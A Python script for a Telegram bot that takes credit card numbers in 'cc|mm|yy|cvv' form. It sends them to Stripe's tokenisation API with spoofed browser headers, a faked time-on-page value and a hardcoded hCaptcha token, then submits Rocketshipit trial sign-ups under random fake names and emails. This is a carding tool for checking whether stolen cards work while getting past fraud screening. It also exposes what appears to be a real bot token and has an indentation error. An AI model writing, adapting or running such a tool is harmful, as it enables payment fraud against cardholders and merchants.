import telebot
import requests
import json
import logging
import random
import string
import time  # For simulating time on page

# Set up logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Replace with your actual Telegram Bot Token
BOT_TOKEN = "8072279299:AAHAEodRhWpDb2g7EIVNFc3pk1Yg0YlpaPc"
bot = telebot.TeleBot(BOT_TOKEN)

# Rocketshipit Specific Information
ROCKETSHIPIT_BASE_URL = "https://www.rocketshipit.com"
STRIPE_API_URL = "https://api.stripe.com/v1/tokens"
PLAN_ID = "price_0OasfuftKVWrByuepaoLFVSB"  # From your example
COUPON_CODE = ""  # You can modify this if needed

# **CRITICAL: Replace with the ACTUAL Rocketshipit Stripe Publishable Key**
STRIPE_PUBLIC_KEY = "YOUR_STRIPE_PUBLIC_KEY"

# Headers for Stripe API
STRIPE_HEADERS = {
    "Content-Type": "application/x-www-form-urlencoded",
    "Accept": "application/json",
    "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_2_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/137.2  Mobile/15E148 Safari/605.1.15",
    "Origin": "https://www.rocketshipit.com",
}

# Headers for Rocketshipit Trial Submission
ROCKETSHIPIT_HEADERS = {
    "Content-Type": "application/x-www-form-urlencoded",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Origin": "https://www.rocketshipit.com",
    "Referer": "https://www.rocketshipit.com/trial",
    "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_2_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/137.2  Mobile/15E148 Safari/605.1.15",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Dest": "document",
    "Accept-Language": "en-US,en;q=0.9",
    "Accept-Encoding": "gzip, deflate, br",
}

# Cookies (You MUST find the actual values from the website)
ROCKETSHIPIT_COOKIES = {
    "__stripe_mid": "YOUR_STRIPE_MID",
    "__stripe_sid": "YOUR_STRIPE_SID",
}

def generate_random_string(length=32):
    characters = string.ascii_letters + string.digits
    return ''.join(random.choice(characters) for _ in range(length))

def generate_dynamic_email():
    return f"testuser_{generate_random_string(8)}@example.com"

def generate_dynamic_name():
    return f"Test User {generate_random_string(5).capitalize()}"

def create_stripe_token(cc, mm, yy, cvv, name, email):
    guid = generate_random_string(36).replace('-', '')  # Simulate GUID generation
    muid = ROCKETSHIPIT_COOKIES.get("__stripe_mid", "")
    sid = ROCKETSHIPIT_COOKIES.get("__stripe_sid", "")
    referrer = "https://www.rocketshipit.com/trial"
    time_on_page = random.randint(5000, 60000)  # Simulate time on page (milliseconds)
    hcaptcha_token = "P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwYXNza2V5IjoiZ0lVcmVFQnVZY0NuZ3Q0ZjI0NHRsQWpCVHlxTDdCWk5qMG5iQlFIbDA4cjd3OVo1SGdySEhFOW05WGxMc1poYVRtbE1JMjZqWTFGYnZ2Z1FKdkNMc1RhY1dZRkpGeXlwVjdqcFJQWUhpVTlqc1BJMldsRVZhMXlmcWhlRndKQWtacmlhN0NzVHRNaHhRWDVZQW15R1BOOFJQRFA5NGxBUjZzQkxEUFdKU3R0ZGRFcVJ3SitCZnFpeWZBK0NIcmNhR3ZNM20xR3BtbGtyYkVEV2JuZWZtUVBNWXFkVHByalpzMGI0c0VsSEIvbjBLWnJVQlVGMzhCSGRPdWNTOGJRdExhdzJNejQ4RkFyQ2pRY0lKblZCcnFvdHdCMmdKUDVyalpMb0FQYktXd25UNHB0bk1KbE5TT05XYTY2RVdKRkkyQ3B1amNjalcydk1rekhKN3lEaW1zYm82VHBJSTlxamFBeWt3ZFFnYzhGNzdqZ2NmRFNla2o2NlQrNm5wNVYyVTdneTRFZ1kvN2lqQ1grcllBcENkR1dLRmNOWUVUR3J5MHp6czl5SU5aM0ZLOUVQRzR0OUcvUFVFWUxWbjBUQ3Q4TjAzYWx3Q0R4WVdrL3FpaXFKQ0N3MUUvQmRGNjZjSFlOSDFKRGpSVUpjNW1HYkNiaHpqU3FFaHU0QmYrK1Vsb2Q2RnlpVDJvRWlyUXpHdnVpUDdyWllzeXFXUFRQWDhGZG9pVEZIK1BPTmhLZzFrWDcyK2VLZXI3bXdoMkcyU0RGdGRjb1VJaXMxaGtjYXM1MUROUURPdjFUYkd0bjMxVGlsN2hjR3pLOHJEa05VN04xVXlKOXlMVEl4N1FEMDF5QzdCQXM0K1c1Si9EbzBFbXJIVFV2VHdtTC9QRnNzV0VLcVJveFVyWHFSUDlVMjRqc2FjSTNiWUxXSUlTd3ptczdNaVpVSGw1cjllcHhBL2ROMWRjRG5IbDYrNGh0QndUU2Z2dlhTbWY2SGpCYkU0cGthQ0YveFVTeXVsN2F1VVpyNDhuUkplUUxWQzlMOGhLWWdSUjRjYlhnazVHR1lBYTQ5em1sTlB6Nmx5VXp4eTUzbFhvaHExcGxXYXVQN1JzdEVQdWd3NUFWd0F2bDBRUHVLdjFzWDEzZGltZzB6ZWFWWlhEMEN0TnE4c3BDVlZYRWZmNTc5VGRuZ2wxaXJzV3N3UXRGaTRuU21YZ0hZbldlVjJGallWOWRGeS9ReDhnU0tJa0lqNU54UXpkaUhYVFBGUC9JTFRIck5PanZWOFU4Mm1XUEZLZlNaNlNreUlGZE43a3p2Y01yR3RSeWZ2N1I1bTdLZjV5TGRqQUhiOEpyay9GQzZUcXo1UWtBUUZrNG5ZSFhzRzFBdC9Ta09DWW9Tck9KY1lNWE1lZUFSMVJmdmdSWHl6MWUzYUtuTGR1TE5GVmZKWjV5TTNJZ1NKTm9KZDlydEwxhQmc5T2xTR3c3Q2VUzNJSnlLTXVuTUZoNnJBdUpPQnVlOXlJdXNHald1ejBYWXM4Nk13RlF3STZPYUU3RjRxWVJ5dlowNlFYVlp1LzNKV3U1RDJSd2dkS1NqYmwvVDhuNGNOUDlSeUNtcWlyUk50UjVnbkpBMzgzM0duYTIxZE1uK3R6b2JQb0ZhYnErQkliRUQwM0t5T2ZYVHNBa25tZWxOUDNmMmVVS3RGY2dkMDhGMWFVVEhNb29QaHFUQTZ0YW1kSzVvRktqQUJ6WmhBSGFScWNQSnB3enZVZ1FjdHErRHFVb0Rxdmh4MEEvUU1oYTU1K0ZiRU9mdm94TmVuUkxuYkR0RjdGT2tNbld2aHdEbDhNS2dKSVhLcWZLNGs3OGNVdEJ2ZkdGZ2dPZ2I0dEk0Z0JiM1ErdStTa3VTSnZrZGtyNmlQSzZtWnBoRGZHTnRLQVVBQU9XUXpwYWk0eVZObGNYbnk5bzR5aDFTRGIwZ2pSZnBRSXovSXlpMW1EK2U3cmxISEJYdkVKUldqZ01Pb0NnaWM4QTVlWC9TWWE1TTBLSjQ0REdIS0hiQWg0V0Q3d0hrelBNK25ySERVa0VYNEZmUi9QY2RHZnNoc216V2xrR3ZOdmgrUGlDU3lialBsbDhqUVdnK3NCMHZKcE9URktNQUR4OHJEam5BdGZxNTdsZ3Z6Sjl2WWZXb3lLcXd4L3NqME5lY2p0Ny9DalNoeGFtbkk3aE02U2EzUlhySWhpTG5KYkEzVjVvYzBpbmhuS2xRTWQ4VEQ2c2kvU1RWYmJjVUlua0V5aDc1RkxBUUg3MENMQUdaY1h6akVxK00rSzFEQTNiU2M0aTlqYlAwbkN5S3oyQ1p5M3dadXppVXRMYUdxVkU2T09vU1phYlhoUE50RDYyZnpmai9SaFdseXlwOEpKNlRpSG5SVUFwaVp2TTRZT1N1dHJQcE5mWCs4OTNRanNKU2VkzellKRXExanBKRC9VaWVaZjhlcnAyMDVMdk12RlpEMmFiTXNnMytaU3hHNzNHbDJqSDcyUVlZQXphT0RTak4zbklYZUZ3Rk5YUDFub05XYkZESUVTWnpmc0VHWjRUQlJMdmlOa0FMRUQ1am9Obi8vK2ZYaEdVLzJNdXlYbWJhVW5naEdXTFlHYVpMWW1tdUxkNEJ1SkVuTmpXV0sycnN3cjBzM1E3UEtIT0pUZHN4YVZiTElsUGdCNStIUWw4VnNrOVMwZkt2cy9GWmMrYXpvRHpYQ3R2elRFaXY0MHhLcWZ4SHZ1amxqMTdoNVFiWGNlZWxkd0Rzd2QvK1hFSzliYW4wbEs1NzBFN2VwUTFYdnc3ZkNieHA1a1NVV0FuaUUvbXJzNXhHZkFkdkdaNS9QV289IiwiZXhwIjoxNzQ1ODQ1ODgxLCJzaGFyZF9pZCI6NTM1NzY1NTksImtyIjoiZTAyMGMzMCIsInBkIjowLCJjZGF0YSI6IlMrb0Qvb0xKVzc2VjNqOXZDWVVIN1QzNkVxajJVcmY2YVZ0QUp0eHVXSEFwMTM5R2FnMVFncHFidjNiekJFOWM1QlpxOUJMd0JvZnpKMzZ2TktIWkQ3N25KeEFzNW9rdXQ1amZFWmRDSjVHQnpIN1AvaG9oZElLVFl3cU1HNlNHT3lNMzFXRXdDYUhGOFhHVitmYW9mL0NJK3BoUk9ZOE1UdCtCQWFFYkFoUE5XSzhRQ3VkUFZhYXdPT3d1VnR0NThVR2pGcC9lZFk3V1ozTVoifQ.fXP16-8jXjKwwDqQkayvEmOgjJr1qxNNxaDRVC_vYvw" # Placeholder - you might need to get this dynamically
    payment_user_agent = "stripe.js/b85ba7b837; stripe-js-v3/b85ba7b837; card-element"
    pasted_fields = "number"

    payload = f"guid={guid}&muid={muid}&sid={sid}&referrer={referrer}&time_on_page={time_on_page}&card[number]={cc}&card[cvc]={cvv}&card[exp_month]={mm}&card[exp_year]={yy}&radar_options[hcaptcha_token]={hcaptcha_token}&payment_user_agent={payment_user_agent}&pasted_fields={pasted_fields}&key={STRIPE_PUBLIC_KEY}"
    headers = STRIPE_HEADERS.copy()
    logging.info(f"Stripe Token Request URL: {STRIPE_API_URL}")
    logging.info(f"Stripe Token Request Headers: {headers}")
    logging.info(f"Stripe Token Request Payload: {payload}")
    try:
        response = requests.post(STRIPE_API_URL, headers=headers, data=payload)
        logging.info(f"Stripe Token Response Status Code: {response.status_code}")
        logging.info(f"Stripe Token Response Headers: {response.headers}")
        try:
            response_json = response.json()
            logging.info(f"Stripe Token Response JSON: {json.dumps(response_json)}")
            response.raise_for_status()  # Raise HTTPError for bad responses (4xx or 5xx)
            return response_json.get("id")
        except json.JSONDecodeError:
            logging.error(f"Error decoding Stripe token response: {response.text}")
            return None
    except requests.exceptions.RequestException as e:
        logging.error(f"Error creating Stripe token: {e}")
        return None
    except json.JSONDecodeError:
        logging.error(f"Error decoding Stripe token response (success case): {response.text}")
        return None

# --- Part 1 Ends Here ---
# --- Part 2 Begins Here ---

def submit_trial_form(stripe_token, name, email):
    url = f"{ROCKETSHIPIT_BASE_URL}/trial"
    payload = f"plan={PLAN_ID}&coupon={COUPON_CODE}&name={name}&email={email}&stripeToken={stripe_token}"
    headers = ROCKETSHIPIT_HEADERS.copy()
        headers["Content-Length"] = str(len(payload))
    try:
        response = requests.post(url, headers=headers, data=payload, cookies=ROCKETSHIPIT_COOKIES, allow_redirects=True)
        response.raise_for_status()
        return response.text
    except requests.exceptions.RequestException as e:
        logging.error(f"Error submitting trial form: {e} - Response: {response.text}")
        return f"Error submitting trial: {e}"

# Telegram Bot Handlers
@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.reply_to(message, "Welcome! Send me credit card details in the format: cc|mm|yy|cvv")

@bot.message_handler(func=lambda message: len(message.text.split('|')) == 4)
def process_card(message):
    try:
        cc, mm_str, yy_str, cvv = message.text.split('|')

        if not (mm_str.isdigit() and yy_str.isdigit() and cvv.isdigit()):
            bot.reply_to(message, "Invalid month, year, or CVV. Please use numbers.")
            return

        mm = int(mm_str)
        yy = int(yy_str) if len(yy_str) == 4 else int(f"20{yy_str}")

        bot.reply_to(message, "Processing card...")

        dynamic_email = generate_dynamic_email()
        dynamic_name = generate_dynamic_name()

        stripe_token = create_stripe_token(cc, mm, yy, cvv, dynamic_name, dynamic_email)

        if stripe_token:
            bot.reply_to(message, f"Stripe Token created: {stripe_token}. Submitting trial...")
            website_response = submit_trial_form(stripe_token, dynamic_name, dynamic_email)
            bot.reply_to(message, f"Website Response:\n{website_response}")
        else:
            bot.reply_to(message, "Failed to create Stripe token. Card might be invalid.")

    except ValueError:
        bot.reply_to(message, "Invalid input format. Please use: cc|mm|yy|cvv")
    except Exception as e:
        logging.error(f"Error processing card input: {e}")
        bot.reply_to(message, f"An error occurred: {e}")

@bot.message_handler(func=lambda message: True)
def echo_all(message):
    bot.reply_to(message, "Send me credit card details in the format: cc|mm|yy|cvv")

if __name__ == '__main__':
    logging.info("Bot started...")
    bot.polling(none_stop=True)
